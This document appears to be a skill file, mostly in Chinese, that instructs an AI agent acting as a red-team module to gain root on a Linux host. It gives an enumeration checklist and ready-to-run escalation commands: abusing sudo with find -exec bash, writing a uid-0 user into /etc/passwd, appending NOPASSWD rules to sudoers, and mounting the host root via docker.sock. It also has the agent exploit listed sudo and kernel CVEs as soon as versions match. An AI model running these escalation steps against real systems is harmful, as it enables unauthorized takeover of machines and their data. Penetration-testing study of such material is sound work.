---
name: privesc-linux
description: "Linux local privilege escalation from a low-privilege shell to root. Covers quiet vs loud enumeration, sudo/GTFOBins, CVE-2025-32463 chwoot and CVE-2025-32462 host bypass, polkit/udisks CVE-2025-6018/6019, SUID/capabilities, systemd timers/units, cron/PATH/LD_PRELOAD, dangerous groups and docker.sock, host-local container escape, and version-gated kernel LPE including Copy Fail CVE-2026-31431. Use when the operator has a Linux foothold and needs root. Kubernetes RBAC stays in /k8s. Endpoint blocks hand off to /edr-bypass then return here."
---

# /privesc-linux — Linux 本机提权

> **scope：** 已有低权限 Linux foothold，打到 **`uid=0` root shell**。不做横移、数据外带、主机持久化、K8s RBAC/集群控制。▸ 拿到 root 后记 notes，候选只认 `~/.claude/skills/shared/modules.yaml`（`modules.py tail`），由操作者选。

本模块是红队攻击模块。`sudo -l` 能 GTFOBins 就立刻 root，不要停在“发现可 sudo find”。写 cron/改 unit 是手段，**`id` 显示 `uid=0` 才是成功**。

工具：`../shared/tools.md`。有精确内核/sudo 版本才读 `../shared/cve-enrichment.md`。走到对应分支再 Read **一份**：

- GTFOBins 速查 → `references/gtfobins-common.md`
- sudo / polkit / udisks → `references/sudo-polkit.md`
- SUID / caps / systemd / cron / PATH → `references/suid-caps-systemd.md`
- 危险组 / docker.sock / 本机容器逃逸 → `references/groups-containers.md`
- Kernel LPE 短表 → `references/kernel-lpe.md`

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 成功条件与攻击强度

```text
低权限 Linux shell
        ↓
本机原语成立（sudo / SUID / 组 / 可写 unit / 未打补丁 LPE）
        ↓
uid=0 root shell（交互或稳定回连）
        ↓
/privesc-linux COMPLETE
```

**成功：** `id` 为 `uid=0(root)`，能执行命令。

**不是成功：** 只跑完 linPEAS、只记录 sudo 规则、只证明 kernel 版本在范围内。

容器内如果已经能 `chroot`/`nsenter` 到宿主机 root，算本模块成功（host root）。集群 admin / SA 横向是 `/k8s`。

---

## 0.5 Endpoint Defense Boundary — 可选 /edr-bypass Handoff

`/privesc-linux` 自己拥有本机提权链直到 root。

仍属本模块、不是 EDR：

```text
sudoers 不允许
SUID 不是 GTFOBins 可利用二进制
seccomp/AppArmor/SELinux 拒绝某条 syscall（先换路径）
kernel 已补丁
docker 组不存在且 sock 不可写
```

只有 **exploit/payload 已在 OS 执行** 且被 EDR/audit agent/ Falco 类 endpoint 明确杀掉时：

```text
privesc primitive confirmed
        ↓
endpoint/security agent blocks intended action?
├─ NO  → 继续 /privesc-linux 直到 root
└─ YES → 操作者可临时选择 /edr-bypass
            ↓
         恢复执行能力
            ↓
         返回 /privesc-linux
            ↓
         拿完 root
```

AppArmor 拒 docker、sudoers 语法不允许，不是 EDR handoff。

---

## 0.6 自动漏洞库

sudo / polkit / kernel / glibc / needrestart **先精确版本再查库**。

```bash
uname -a
cat /etc/os-release
sudo --version
pkexec --version 2>/dev/null
ldd --version | head -1
dpkg -l sudo pkexec libblockdev udisks2 needrestart 2>/dev/null
rpm -q sudo polkit libblockdev udisks2 needrestart 2>/dev/null
```

然后 `../shared/cve-enrichment.md` 节 `/privesc-linux`。命中再进对应 reference。无公开稳定 PoC 不编命令。

---

## 1. 决策树（按这个顺序打）

```text
id ; sudo -l ; uname -r ; 是否容器
        ↓
A. sudo -l 有 GTFOBins / NOPASSWD ALL
      → 立刻 root shell
B. sudo 版本命中 CVE-2025-32463 / 32462 / 2021-3156 / 2023-22809
      → references/sudo-polkit.md（32463 不需要 sudoers 条目）
C. pkexec/polkit/udisks：PwnKit 或 CVE-2025-6018/6019
      → references/sudo-polkit.md
D. SUID / cap_setuid / cap_dac_* / cap_sys_admin
      → gtfobins + references/suid-caps-systemd.md
E. docker/lxd/disk 组 或 可写 docker.sock / containerd.sock
      → 本机 host root（references/groups-containers.md）
F. 可写 passwd/shadow/sudoers / systemd unit / timer / cron / NFS no_root_squash
      → 写文件提权
G. 容器内（操作者选了本模块）
      → privileged / 宿主磁盘 / sock / 本机 kernel LPE
      → K8s API/RBAC 只作为候选 /k8s，不在这里展开
H. 以上都没有
      → uname -r + distro → ../shared/cve-enrichment.md → references/kernel-lpe.md
```

---

## 2. 枚举：Quiet 默认，Loud 要操作者同意

### 2.1 Quiet

```bash
id
sudo -l
uname -a
cat /etc/os-release
hostname
env | grep -Ei 'USER|HOME|PATH|LD_|SUDO'
cat /proc/1/cgroup 2>/dev/null | head
[ -f /.dockerenv ] && echo DOCKER
[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo K8S_POD
ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
getcap -r / 2>/dev/null
find /usr /bin /sbin /opt -perm -4000 -type f 2>/dev/null
```

`sudo -l` 是最重要的一条命令。有输出就先打 A/B，不要先 linPEAS。

### 2.2 Loud

```bash
./linpeas.sh | tee linpeas.out
./pspy64
./linux-exploit-suggester.sh
```

linPEAS 标红 / LES 命中必须再过版本门 + 公开 PoC。禁止“工具说能打就 gcc”。

pspy 用来抓 root cron/timer 实际执行的命令，比只读 `/etc/crontab` 准。

---

## 3. sudo / polkit（先打这条）

```bash
sudo -l
sudo --version
```

```text
(root) NOPASSWD: /usr/bin/find     → sudo find / -exec /bin/bash -p \; -quit
(root) NOPASSWD: ALL               → sudo -i
sudo 1.9.14–1.9.17                 → CVE-2025-32463 chwoot，任意本地用户 root
sudoers 按 Host 限制               → CVE-2025-32462 -h 绕过
pkexec 未修                        → PwnKit
allow_active + udisks              → CVE-2025-6019
```

GTFOBins 高频 → **references/gtfobins-common.md**  
版本洞与 polkit/udisks → **references/sudo-polkit.md**

CVE-2025-32463 是 2025 年最不该错过的 Linux LPE：不需要 sudoers 里有你的规则。版本命中就打。

---

## 4. SUID / capabilities / systemd / cron

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
systemctl list-timers --all
ls -l /etc/systemd/system /lib/systemd/system
cat /etc/crontab
ls -l /etc/cron.*
```

`cap_setuid+ep` 的解释器直接 `setuid(0)`。可写 systemd unit / timer 比 cron 更常见于现代发行版。PATH 劫持只在二进制用裸命令名时打。

完整 → **references/suid-caps-systemd.md**

---

## 5. 可写关键文件

```bash
ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d
find /etc/systemd /etc/cron* /usr/local -writable 2>/dev/null
```

```bash
# 可写 passwd → 加 uid=0
openssl passwd -6 'Pass123!'
echo 'root2:$6$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

可写 sudoers：`echo 'USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` 然后 `sudo -i`。打完记下原文件以便 RESTORE。

---

## 6. 危险组 / 容器（本机 host root）

```bash
id
ls -l /var/run/docker.sock
```

```text
docker 组 或 可写 docker.sock  → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
lxd/lxc 组                     → privileged 容器挂宿主 /
disk 组                        → 裸设备读 shadow，或写 suid bash
privileged 容器                → 挂宿主磁盘 / nsenter
```

这是 **这台机器的 host root**。不要在这里跑 `kubectl auth can-i` 当主路径。看到 SA token 可以记一笔候选 `/k8s`。

完整 → **references/groups-containers.md**

NFS `no_root_squash` 也在该文件。

---

## 7. Kernel / 本地 CVE

```text
uname -r + /etc/os-release + 包版本
→ ../shared/cve-enrichment.md
→ 发行版公告确认未修 + 公开稳定 PoC
→ references/kernel-lpe.md
```

短名单（仍要门控）：

| 对象 | CVE |
|---|---|
| 主机/容器 kernel LPE | CVE-2026-31431 Copy Fail |
| nf_tables | CVE-2024-1086 |
| OverlayFS | CVE-2023-0386（KEV） |
| Ubuntu overlay | CVE-2023-2640 / 32629 |
| DirtyPipe | CVE-2022-0847 |
| glibc suid | CVE-2023-4911 Looney Tunables |
| Ubuntu needrestart | CVE-2024-48990 |

Copy Fail 的 **主机 Python PoC** 在本模块；**K8s 跨工作负载 DaemonSet PoC** 在 `/k8s`。同一 CVE，两条配方，不要混。

错版本会 panic。LES 命中 ≠ 可打。Dirty Frag 等只有研究帖、没有稳定公开利用的，标候选，不写假命令。

---

## 8. 完成后

```bash
id
uname -a
hostname -f
ip a
```

记 notes：原语、版本、是否改了 passwd/sudoers/unit、容器是否逃到 host。
候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。

RESTORE：删 stage 目录、恢复 unit/cron/passwd、卸恶意 SUID、Copy Fail 后按 PoC 清理 page-cache 副作用。
